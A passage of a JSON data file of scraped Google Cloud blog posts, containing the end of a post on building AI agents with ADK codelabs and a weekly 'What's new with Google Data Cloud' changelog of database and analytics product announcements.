        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The world of </span><a href=\"https://cloud.google.com/use-cases/generative-ai?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Generative AI</span></a><span style=\"vertical-align: baseline;\"> is evolving rapidly, and </span><a href=\"https://cloud.google.com/discover/what-are-ai-agents?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI Agents</span></a><span style=\"vertical-align: baseline;\"> are at the forefront of this change. An AI agent is a software system designed to act on your behalf. They show reasoning, planning, and memory and have a level of autonomy to make decisions, learn, and adapt.</span></p>\n<p><span style=\"vertical-align: baseline;\">At its core, an </span><a href=\"https://cloud.google.com/discover/what-are-ai-agents?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI agent</span></a><span style=\"vertical-align: baseline;\"> uses a </span><a href=\"https://cloud.google.com/ai/llms?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">large language model (LLM)</span></a><span style=\"vertical-align: baseline;\">, like </span><a href=\"https://ai.google.dev/gemini-api/docs/models?utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini</span></a><span style=\"vertical-align: baseline;\">, as its \"brain\" to understand and reason. This allows it to process information from various sources, create a plan, and execute a series of tasks to reach a predefined objective. This is the key difference between a simple prompt-and-response and an agent: the ability to act on a multi-step plan.</span></p>\n<p><span style=\"vertical-align: baseline;\">The great news is that you can now easily build your own </span><a href=\"https://cloud.google.com/discover/what-are-ai-agents?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI agents</span></a><span style=\"vertical-align: baseline;\">, even without deep expertise, thanks to<strong> </strong></span><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Development Kit (ADK)</span></a><span style=\"vertical-align: baseline;\">. ADK is an open-source </span><a href=\"https://google.github.io/adk-docs/get-started/python/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Python</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://google.github.io/adk-docs/get-started/java/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Java</span></a><span style=\"vertical-align: baseline;\"> framework by Google designed to simplify agent creation.</span></p>\n<p><span style=\"vertical-align: baseline;\">To guide you, this post introduces three hands-on labs that cover the core patterns of agent development:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Building your first autonomous agent</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Empowering that agent with tools to interact with external services</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Orchestrate a multi-agent system where specialized agents collaborate</span></p>\n</li>\n</ol></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Build your first agent</span></h2>\n<p><span style=\"vertical-align: baseline;\">This lab</span><span style=\"vertical-align: baseline;\"> introduces the foundational principles of </span><a href=\"https://github.com/google/adk-python\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ADK</span></a><span style=\"vertical-align: baseline;\"> by guiding you through the construction of a </span><strong style=\"vertical-align: baseline;\">personal assistant agent</strong><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">You will write the code for the agent itself and will interact </span><span style=\"vertical-align: baseline;\">directly with the agent's core reasoning engine, powered by </span><a href=\"https://ai.google.dev/gemini-api/docs/models?utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini</span></a><span style=\"vertical-align: baseline;\">, to see how it responds to a simple request. This lab is focused on building the fundamental scaffolding of every agent you'll create.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Go to the lab!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f91898ce160&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Empower your agent with tools</span></h2>\n<p><span style=\"vertical-align: baseline;\">An agent without custom tools can only rely on its built-in knowledge. To make it more powerful for your specific use-case, you can give it access to specialized tools. In this lab, you will learn three different ways to add tools:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Build a Custom Tool:</strong><span style=\"vertical-align: baseline;\"> Write a currency exchange tool from scratch.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Integrate a Built-in Tool:</strong><span style=\"vertical-align: baseline;\"> Add </span><a href=\"https://github.com/google/adk-python\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ADK</span></a><span style=\"vertical-align: baseline;\">'s pre-built </span><a href=\"https://google.github.io/adk-docs/tools/built-in-tools/#google-search\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Search tool.</span></a></li>\n<li><strong style=\"vertical-align: baseline;\">Leverage a Third-Party Tool:</strong><span style=\"vertical-align: baseline;\"> Import and use a </span><a href=\"https://docs.langchain.com/oss/javascript/integrations/tools/wikipedia\" rel=\"noopener\" target=\"_blank\">Wikipedia tool</a> <span style=\"vertical-align: baseline;\">from the LangChain library.</span></li>\n</ul></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Go to the lab!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f91898ce5e0&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Build a Team of Specialized Agents</span></h2>\n<p><span style=\"vertical-align: baseline;\">When a task is too complex for a single agent, you can build out a multi-agent team. This lab goes deep into the power of </span><a href=\"https://cloud.google.com/discover/what-is-a-multi-agent-system?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">multi-agent systems</span></a><span style=\"vertical-align: baseline;\"> by having you build a \"movie pitch development team\" that can research, write, and analyze a film concept.</span></p>\n<p><span style=\"vertical-align: baseline;\">You will learn how to use </span><a href=\"https://google.github.io/adk-docs/agents/workflow-agents/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ADK's Workflow Agents</span></a><span style=\"vertical-align: baseline;\"> to control the flow of work automatically, without needing user input at every step. You'll also learn how to use the session state to pass information between the agents.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Go to the lab!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f91898cee50&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Summary: Build Your First AI Teammate Today</span></h2>\n<p><span style=\"vertical-align: baseline;\">Ready to build your first </span><a href=\"https://cloud.google.com/discover/what-are-ai-agents?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI agents</span></a><span style=\"vertical-align: baseline;\">? </span><span style=\"vertical-align: baseline;\">Dive into the codelabs from this post:</span></p>\n<ul>\n<li><a href=\"https://codelabs.developers.google.com/devsite/codelabs/build-agents-with-adk-foundation?hl=en#0&amp;utm_campaign=CDR_0x6e136736_default_b456239055&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\">Building AI Agents with ADK: The Foundation</a></li>\n<li><a href=\"https://codelabs.developers.google.com/devsite/codelabs/build-agents-with-adk-empowering-with-tools?hl=en\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Empower ADK Agents with Tools</span></a></li>\n<li><a href=\"https://codelabs.developers.google.com/codelabs/production-ready-ai-with-gc/3-developing-agents/build-a-multi-agent-system-with-adk?hl=en#0\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\">Build Multi-Agent Systems with ADK</span></a></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Share your progress and connect with others on the journey using the hashtag </span><strong style=\"vertical-align: baseline;\">#ProductionReadyAI</strong><span style=\"vertical-align: baseline;\">. Happy learning! </span></p></div>",
        "published_date": "2025-11-07 09:49:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/whats-new-with-google-data-cloud/",
        "title": "What’s new with Google Data Cloud",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/original_images/whats_new_data_cloud_fWg4bKK.png",
        "author": "The Google Cloud Data Analytics, BI, and Database teams",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">November 3 - November 7 </span></h3>\n<ul>\n<li><span style=\"vertical-align: baseline;\">We have announced the</span><strong style=\"vertical-align: baseline;\"> </strong><a href=\"https://medium.com/google-cloud/spanner-better-with-bigquery-streaming-insights-faster-federated-queries-with-iceberg-and-04e1299dd831\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">next generation of Spanner-better-with-BigQuery capabilities</strong></a><span style=\"vertical-align: baseline;\"> delivering streaming insights, faster federated queries, cross-region data operations across Spanner and BigQuery data including Iceberg tables.</span></li>\n<li><a href=\"https://cloud.google.com/sql/docs/postgres/manage-memory-usage-best-practices#cancelled-query\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Memory Agent for Cloud SQL for PostgreSQL</strong></a><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">is now generally available. Previously, memory-intensive queries could cause PostgreSQL restarts due to the Linux OOM killer. This led to downtime and no clear way for users to identify problematic queries. The new Memory Agent proactively detects and gracefully cancels high-memory connections, preventing restarts. With a recommender, it offers details and suggestions to alleviate memory pressure, providing a better user experience.</span></li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">We're excited to announce the General Availability of </span><a href=\"https://docs.cloud.google.com/sql/docs/sqlserver/cmad\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Customer-managed Active Directory integration</span></a><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">with Cloud SQL for SQL Server. This allows Windows authentication for Cloud SQL for SQL Server instances using existing AD environments, eliminating the need for Google Managed AD and simplifying critical SQL Server workloads.</span></span></span></span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">October 24 - October 31</span></span></span></h3>\n<ul>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Dive into the newest Google Cloud Tech Bytes videos for </span><a href=\"https://www.youtube.com/watch?v=NGkO5YMQctU&amp;t=2s\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud SQL</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://www.youtube.com/watch?v=RunwI3gYLAE\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Spanner</span></a><span style=\"vertical-align: baseline;\">! Get the practical details you need to set up and optimize our fully managed databases so you can simplify operations and accelerate development.</span></span></span></span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">October 20 - October 24</span></span></h3>\n<ul>\n<li><a href=\"https://cloud.google.com/database-migration\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Database Migration Service</span></a><span style=\"vertical-align: baseline;\"> now offers Object Level Observability, providing enhanced visibility and control over data migration. Previously limited to job-level oversight, these capabilities have been expanded to the individual table level, allowing for detailed insight into your data movement while heterogeneous database migration (e.g SQL Server to PostgreSQL).</span></li>\n<li><span style=\"vertical-align: baseline;\">Cloud SQL's Enterprise Plus edition now supports the </span><a href=\"https://cloud.google.com/blog/products/compute/try-c4a-the-first-google-axion-processor\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Axion</span><span style=\"text-decoration: underline; vertical-align: baseline;\">-based C4A machine series</span></a><span style=\"vertical-align: baseline;\"> in GA. This offers our customers significant performance benefits: nearly</span><strong style=\"vertical-align: baseline;\"> 50% better price-performance </strong><span style=\"vertical-align: baseline;\">compared to current N2 machines and up to</span><strong style=\"vertical-align: baseline;\"> 2x greater transactional throughput</strong><span style=\"vertical-align: baseline;\"> than Amazon RDS Graviton 4-based offerings.</span></li>\n<li><span style=\"vertical-align: baseline;\">Firestore with Enterprise Edition now offers </span><a href=\"https://cloud.google.com/firestore/mongodb-compatibility/docs/saved-queries\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Saved Queries</span></a><span style=\"vertical-align: baseline;\">.This new feature enables users to save and share queries for a specific database directly from the Firestore Studio page.</span></li>\n<li><span style=\"vertical-align: baseline;\">At Oracle AI World ‘25, </span><a href=\"https://cloud.google.com/products/gemini/databases\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Database Center</span></a><span style=\"vertical-align: baseline;\"> announced expanded support for Oracle Database@Google Cloud. This update allows customers to monitor Oracle Exadata and Autonomous databases, including their inventory and metrics, directly within the Database Center UI and Chat. Now, Google Cloud database services and Oracle inventory can be monitored side-by-side.</span></li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Managed Kafka Connect is now generally available. Replicate on-prem clusters to Managed Service for Apache Kafka clusters, surface Kafka data in BigQuery, backup the data in Cloud Storage, or activate it in Pub/Sub. Unlock the real value of your Kafka data. </span><a href=\"https://cloud.google.com/managed-service-for-apache-kafka/docs/connect-cluster/kafka-connect-write-to-bigquery\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Get started with Kafka Connect today</span></a><span style=\"vertical-align: baseline;\">.</span></span></span></li>\n<li><strong style=\"vertical-align: baseline;\"><strong style=\"vertical-align: baseline;\">October 13 - October 17</strong></strong></li>\n<li><span style=\"vertical-align: baseline;\">Don't miss the </span><a href=\"https://cloudonair.withgoogle.com/events/databases-innovation-roadmap-2025\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Database Innovation Roadmap Webinar</strong></a><span style=\"vertical-align: baseline;\"> on </span><strong style=\"vertical-align: baseline;\">October 30th</strong><span style=\"vertical-align: baseline;\">, where we'll reveal the strategies and roadmap to supercharge </span><strong style=\"vertical-align: baseline;\">agentic development</strong><span style=\"vertical-align: baseline;\"> and the next wave of </span><strong style=\"vertical-align: baseline;\">AI innovation</strong><span style=\"vertical-align: baseline;\">. This event kicks off our new </span><strong style=\"vertical-align: baseline;\">Database Innovation Series</strong><span style=\"vertical-align: baseline;\">, granting you access to 5+ deep-dive sessions shortly after the main event!</span></li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">October 6 - October 10</strong></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Cloud SQL now offers </span><a href=\"https://cloud.google.com/sql/docs/mysql/backup-recovery/restore#deleted-instance\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">point-in-time recovery (PITR) for deleted instances</strong></a><span style=\"vertical-align: baseline;\">, addressing compliance, accidental deletion, and disaster recovery needs. This feature requires customers to enable backup retention and PITR on their instances. Users can utilize the existing</span><a href=\"https://cloud.google.com/sql/docs/mysql/backup-recovery/pitr#perform-pitr-deleted-instance\"><span style=\"text-decoration: underline; vertical-align: baseline;\"> PITR clone API</span></a><span style=\"vertical-align: baseline;\"> (with source-instance-deletion-time) and</span><a href=\"https://cloud.google.com/sql/docs/mysql/backup-recovery/pitr#get-the-latest-recovery-time\"><span style=\"text-decoration: underline; vertical-align: baseline;\"> getLatestRecoveryTime API</span></a><span style=\"vertical-align: baseline;\"> to manage deleted instances. The PITR window shortens based on log retention: up to 35 days for Enterprise Plus instances and 7 days for Enterprise instances.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Introducing the</span><strong style=\"vertical-align: baseline;\"> </strong><a href=\"https://cloud.google.com/sql/docs/postgres/upgrade-major-db-version-inplace#precheck\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Precheck API for Cloud SQL for PostgreSQL</strong></a><span style=\"vertical-align: baseline;\">. This new feature improves Major Version Upgrades by proactively identifying potential issues, preventing unplanned downtime caused by instance incompatibilities (extensions, flags, data types). It addresses customer requests for a precheck utility to identify and remedy upgrade issues beforehand.</span></p>\n</li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">AlloyDB now supports the</span><span style=\"vertical-align: baseline;\"> </span><a href=\"https://github.com/tds-fdw/tds_fdw\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">tds_fdw extension</span></a><span style=\"vertical-align: baseline;\">, enabling direct access to SQL Server and Sybase databases. This feature streamlines database migrations and allows hybrid data analysis, complementing existing oracle_fdw support.</span></span></li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">September 29 - October 3</strong></h3>\n<p><strong style=\"vertical-align: baseline;\">Cloud SQL announced support for </strong><a href=\"https://cloud.google.com/sql/docs/mysql/managed-connection-pooling\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Managed Connection Pool</strong></a><strong style=\"vertical-align: baseline;\"> (in GA) across MySQL and PostgreSQL</strong></p>\n<ul>\n<li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Managed Connection Pooling lets you scale your workloads by optimizing resource utilization for Cloud SQL instances using pooling. You can now also use </span><a href=\"https://cloud.google.com/sql/docs/postgres/iam-authentication\"><span style=\"text-decoration: underline; vertical-align: baseline;\">IAM authentication</span></a><span style=\"vertical-align: baseline;\"> to secure connections when using Managed Connection Pooling. To understand how it works, its key benefits, and how to configure Managed Connection Pooling for your workloads, dive into these guides:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><strong>MySQL:</strong> <a href=\"https://discuss.google.dev/t/boost-your-cloud-sql-for-mysql-performance-through-managed-connection-pooling/269283\" rel=\"noopener\" target=\"_blank\">https://discuss.google.dev/t/boost-your-cloud-sql-for-mysql-performance-through-managed-connection-pooling/269283</a></span></li>\n<li style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><strong>PostgreSQL:</strong> <a href=\"https://discuss.google.dev/t/optimizing-performance-and-scaling-with-managed-connection-pooling-for-cloud-sql-for-postgresql/270528?u=sagarsidhpura\" rel=\"noopener\" target=\"_blank\">https://discuss.google.dev/t/optimizing-performance-and-scaling-with-managed-connection-pooling-for-cloud-sql-for-postgresql/270528?u=sagarsidhpura</a> </span></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">September 22 - September 26</strong></h3>\n<p><a href=\"https://cloud.google.com/alloydb/docs/release-notes\"><span style=\"text-decoration: underline; vertical-align: baseline;\"><strong>AlloyDB now supports PostgreSQL 17 in GA</strong></span></a></p>\n<p><span style=\"vertical-align: baseline;\">AlloyDB now offers general availability for PostgreSQL 17, bringing with it a range of new features and significant enhancements. Key improvements include:</span></p>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Improved query performance, particularly for materialized Common Table Expressions</span></li>\n<li><span style=\"vertical-align: baseline;\">Incremental backup capabilities</span></li>\n<li><span style=\"vertical-align: baseline;\">Enhanced logical replication features</span></li>\n<li><span style=\"vertical-align: baseline;\">Improvements to the JSON data type handling</span></li>\n</ul>\n<p><strong><a href=\"https://storage.googleapis.com/cloud-training/CLS_LIVE_DataSheets/Live_Data_Sheets/English/T-AIATDB-A%20_DS_EN.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Build AI Agents with Enterprise Databases</span></a><span style=\"vertical-align: baseline;\"> (NEW! Training Course)</span></strong></p>\n<p><span style=\"vertical-align: baseline;\">This on-demand course teaches how to build AI agents that can leverage our enterprise databases using MCP Toolbox for Databases, as a secure middle layer. You will learn to securely connect AI agents to your existing databases like AlloyDB, Cloud SQL, and Spanner. You can define secure database interaction tools and implement intelligent querying capabilities, including semantic search with vector embeddings.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Gemini CLI extensions for Data Cloud services and popular open source databases released</strong></p>\n<p><span style=\"vertical-align: baseline;\">In June, Google launched the </span><a href=\"https://blog.google/technology/developers/introducing-gemini-cli-open-source-ai-agent/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">open-source Gemini CLI</span></a><span style=\"vertical-align: baseline;\">. Now, developers can leverage open-source Gemini CLI extensions for Google Data Cloud services such as Cloud SQL, AlloyDB, and BigQuery. These extensions streamline data interactions and enhance application development directly from their local environment. For more details, check out the </span><a href=\"https://github.com/google-gemini/gemini-cli/blob/main/docs/extension.md\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">extensions documentation</span></a><span style=\"vertical-align: baseline;\">. You can also explore existing templates to begin creating and sharing your own extensions with the community.</span></p>\n<p><strong><span>Cloud SQL for PostgreSQL now supports the </span></strong><a href=\"https://github.com/ChenHuajun/pg_roaringbitmap\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\"><strong>pg_roaringbitmap extension</strong></span></a></p>\n<p><span style=\"vertical-align: baseline;\">Cloud SQL developers will now benefit from the ability to handle high-scale analytics, complex filtering, and large set operations directly within the managed PostgreSQL environment with unprecedented speed and efficiency.</span></p>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">September 15 - September 19</span></span></span></h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Benchmark-Driven Kafka Optimization: Maximize Throughput and Cut Costs on Google Cloud</strong>\n<ul>\n<li>Choosing the right compression strategy for Google Cloud Managed Service for Kafka is one of the most critical decisions impacting your performance and budget—and many are leaving massive savings on the table. Relying on default settings or guesswork can lead to unnecessarily high network and storage costs, increased latency, and severe throughput bottlenecks. This new, in-depth guide moves beyond theory to provide hard benchmark data, empowering you to make data-driven decisions.This comprehensive analysis systematically tests the most popular codecs (including GZIP, SNAPPY, and LZ4) against a \"no compression\" baseline. <br /><br /><a href=\"https://discuss.google.dev/t/a-guide-to-compression-benchmarking-and-scaling-for-google-cloud-managed-service-for-kafka/263950\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Read the full guide and get the sample benchmark code here.</span></a></li>\n</ul>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Explore and experiment with Spanner's advanced capabilities with ease.</strong> <a href=\"https://www.youtube.com/shorts/YPCoS0akj6I\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Say goodbye to friction and hello to innovation</strong></a><strong style=\"text-decoration: underline; vertical-align: baseline;\">.</strong></p>\n<ul>\n<li><a href=\"https://cloud.google.com/spanner/docs/free-trial-instance?utm_campaign=CDR_0x6cb6c9c7_platform_b439579335&amp;utm_medium=external&amp;utm_source=social\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Free 90-day trial</span></a></li>\n<li><a href=\"https://github.com/GoogleCloudPlatform/cloud-spanner-samples/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Pre-loaded datasets</span></a> <span style=\"vertical-align: baseline;\">for retail, banking, finance, and more</span></li>\n<li><span style=\"vertical-align: baseline;\">Easy data import from MySQL, PostgreSQL dump files, and CSV</span></li>\n<li><span style=\"vertical-align: baseline;\">Dozens of sample queries showcasing advanced features like full-text search, vector search, and graph capabilities</span></li>\n</ul>\n</li>\n<li><span style=\"vertical-align: baseline;\"><a href=\"https://cloud.google.com/blog/products/databases/c4a-axion-processors-for-alloydb-now-ga?e=48754805\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">C4A Axion processor support is now in GA for AlloyDB</strong></a></span>\n<ul>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">It was launched in Preview during Next'25. Customers waiting for GA to evaluate / onboard for production can now get better performance, price-performance and can run their development environment with 50% reduced entry price using one vCPU. </span><span style=\"vertical-align: baseline;\">Ready to get started? If you’re new to AlloyDB, You can sign-up via the</span><span style=\"vertical-align: baseline;\"> </span><a href=\"https://goo.gle/try_alloydb\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB free trial link</span></a><span style=\"vertical-align: baseline;\">.</span></span></li>\n</ul>\n</li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><a href=\"https://cloud.google.com/alloydb/docs/parameterized-secure-views-overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Parameterized Secured Views</strong></a><strong style=\"vertical-align: baseline;\"> (now in Preview) in AlloyDB</strong><span style=\"vertical-align: baseline;\"> provides application data security and row access control using SQL views.</span></span></span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">September 8 - September 12</span></span></span></h3>\n<ul>\n<li><a href=\"https://cloud.google.com/blog/topics/retail/from-query-to-cart-inside-targets-search-bar-overhaul-with-alloydb-ai\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">From query to cart: Inside Target’s search bar overhaul with AlloyDB AI</strong><span style=\"vertical-align: baseline;\"> </span></a>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Target set out to modernize its digital search experience to better match guest expectations and support more intuitive discovery across millions of products. To meet that challenge, they rebuilt their platform with hybrid search powered by filtered vector queries and</span> <a href=\"https://cloud.google.com/alloydb/ai\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB AI</span></a><span style=\"vertical-align: baseline;\">. Target achieved faster, smarter, more resilient search experience that’s already improved product discovery relevance by 20% and delivered measurable gains in performance and guest satisfaction.</span></li>\n</ul>\n</li>\n<li><a href=\"https://cloud.google.com/customers/schibsted?hl=en&amp;e=48754805\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Powering smarter recommendations with Bigtable and BigQuery</strong></a>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Schibsted Marketplaces, a leading online classifieds group in the Nordic region, cut infrastructure costs by 70% and accelerated data insights and model development by adopting Bigtable and BigQuery. This led to faster, more relevant recommendations and a better user experience.</span></li>\n</ul>\n</li>\n<li><a href=\"https://cloud.google.com/alloydb/docs/ai/natural-language-overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB AI natural language</strong></a><strong style=\"vertical-align: baseline;\"> support launched in Public Preview</strong>\n<ul>\n<li><span style=\"vertical-align: baseline;\">AlloyDB now simplifies the process for enterprises to develop highly accurate and secure Gen AI applications. These applications enable end-users to interact with their own data using natural language. The </span><a href=\"https://cloud.google.com/alloydb/docs/ai/generate-sql-queries-natural-language\"><span style=\"text-decoration: underline; vertical-align: baseline;\">new natural language APIs</span></a><span style=\"vertical-align: baseline;\"> integrate seamlessly into agentic architectures and are compatible with Gen AI orchestration frameworks like LangChain, making real-time operational data more accessible for end-user-facing chat experiences.</span></li>\n</ul>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Cloud SQL announced support for the </strong><a href=\"https://cloud.google.com/sql/docs/mysql/about-read-pools\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Read Pools</strong></a><strong style=\"vertical-align: baseline;\"> (in GA) across MySQL and PostgreSQL</strong>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Cloud SQL's read pools offer a significant advantage over self-managed databases, particularly for read-heavy workloads. They simplify operations and enhance scalability by providing a single endpoint for up to 20 read pool nodes, automatically balancing traffic among them. Read pools can also be dynamically scaled up, down, out, or in to accommodate traffic surges.</span></li>\n</ul>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">August 25 - August 29</span></span></h3>\n<ul>\n<li><a 